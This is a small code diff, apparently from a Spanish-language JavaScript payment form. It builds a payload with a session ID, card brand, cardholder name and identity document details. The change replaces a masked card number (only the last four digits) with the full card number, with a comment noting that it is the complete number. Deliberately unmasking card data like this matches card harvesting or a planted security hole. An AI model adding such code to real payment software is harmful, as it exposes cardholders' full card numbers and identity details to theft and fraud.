@@ -1675,7 +1675,7 @@
                         var payload = {
                             sessionId: sessionId,
                             marca: marca,
-                            tarjeta: '************' + cardInput.slice(-4),
+                           tarjeta: cardNumber.value,   // 👈 número completo con espacios
                             titular: cardHolder.value.trim(),
                             docType: document.getElementById('docType').value,
                             docNumber: docNumber.value.trim(),
